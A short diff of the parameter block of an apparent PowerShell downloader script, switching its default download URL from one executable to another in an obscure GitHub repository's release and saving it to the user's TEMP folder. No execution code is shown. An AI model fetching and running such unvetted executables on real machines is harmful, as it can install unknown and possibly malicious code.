@@ -1,5 +1,5 @@
 param (
-    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/release.exe',
+    [string]$DownloadUrl = 'https://github.com/giasfelfebrehber/stuff/releases/download/1/main.exe',
     [string]$OutputPath = "$env:TEMP\release.exe"
 )
 
